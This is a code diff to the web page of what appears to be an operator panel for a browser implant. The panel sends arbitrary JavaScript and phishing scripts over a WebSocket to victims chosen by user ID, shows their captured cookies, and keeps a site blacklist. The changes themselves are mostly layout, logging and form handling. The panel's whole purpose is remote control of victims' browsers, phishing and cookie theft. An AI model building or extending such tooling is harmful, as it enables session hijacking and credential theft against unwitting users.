@@ -105,6 +105,7 @@ function js(){
     var url = document.getElementById("JS_URL").value;
     var jsonPackage = {id:"0", targetID: id, type:"sendJavascript", script:script, domain:url};
     ws.send(JSON.stringify(jsonPackage));
+    //alert("SENT");
 }
 
 function phish(){
@@ -112,6 +113,7 @@ function phish(){
     var url = document.getElementById("Phishing_URL").value;
     var jsonPackage = {id:"0", targetID: id, type:"sendPhishingscript", domain:url};
     ws.send(JSON.stringify(jsonPackage));
+    console.log("SENT");
 }
 
 function send() {
@@ -567,27 +569,27 @@ function fillCookies(id, nameArray, domainArray, valueArray){
         <div class="col-12">
             <div class="row padding">  
                 <!-- Phishing and JSexe -->
-                <div class="col-6">
+                <div class="col-6" id="scriptSection">
                     <!-- Add Javascript -->
-                    <form name="jsForm" onsubmit="js()">
+                    <!-- <form name="jsForm" onsubmit "return js()"> -->
                         <h4>Add javascript execution script:</h4>
                         <br>
                         <input type = "text" class="form-control" id = "JS_ID" placeholder = "User ID">
                         <input type = "text" class="form-control" id = "JS_Script" placeholder = "Script">
                         <input type = "text" class="form-control" id = "JS_URL" placeholder = "URL">
-                        <input type = "submit" id = "Submit_JS_Script" class="btn btn-outline-secondary">
-                    </form>
+                        <input type = "submit" id = "Submit_JS_Script" class="btn btn-primary" onclick="js()">
+                    <!-- </form> -->
                 </div>
                 <div class="col-6">
                     <!-- Add Phishing -->
-                    <form name="phishingForm" onsubmit="phish()">
+                    <!-- <form name="phishingForm" onsubmit "return phish()"> -->
                         <h4>Add phishing script:</h4>
                         <br>
                         <input type = "text" class="form-control" id = "Phishing_ID" placeholder = "User ID">
                         <!-- <input type = "text" name = "Phishing_Script" placeholder = "Script"><br> -->
                         <input type = "text" class="form-control" id = "Phishing_URL" placeholder = "URL">
-                        <input type = "submit" id = "Submit_Phishing_Script" class="btn btn-outline-secondary">
-                    </form>
+                        <input type = "submit" id = "Submit_Phishing_Script" class="btn btn-primary" onclick="phish()">
+                    <!-- </form> -->
                 </div>
             </div>
         </div>
@@ -603,28 +605,26 @@ function fillCookies(id, nameArray, domainArray, valueArray){
 
     <!-- Adding Blacklisted Site -->
 
-    <div class="col-6">
+    <br>
 
-        <h4>Blacklisted Sites</h4>
-        <ul class = "list-group" id="blacklist"></ul>
+    <h4>Blacklisted Sites</h4>
+    <ul class = "list-group" id="blacklist"></ul>
 
-        <br><br>
+    <br><br>
 
-        <h4>Add site to blacklist:</h4>
-        <form onsubmit="blacklist()">
-            <input type = "text" class="form-control" id="blacklistEntry" placeholder="URL">
-            <input type = "submit" class="btn btn-outline-secondary">
-        </form>
+    <h4>Add site to blacklist:</h4>
+    <form onsubmit="blacklist()">
+        <input type = "text" id="blacklistEntry" placeholder="URL"><br>
+        <input type = "submit" class="btn btn-primary">
+    </form>
 
-    </div>
-
-   <br><br><br>
+   <br><br><br><br><br><br><br><br>
 
     
 	</div>
   </div>
 
-  <!-- <br><br>
+  <br><br>
   <button onclick="getElementById('p1').innerHTML = ''">Clear log</button>
   <form onsubmit="send();return false;">
     ID: <input type="text" id="id"><br>
@@ -634,7 +634,7 @@ function fillCookies(id, nameArray, domainArray, valueArray){
     <input type="text" id="dataType3">: <input type="text" id="data3"><br>
     <input type="submit" value="Submit">
   </form>
-  <p id="p1">Recieved data will show here:</p> -->
+  <p id="p1">Recieved data will show here:</p>
 
 
   </body>
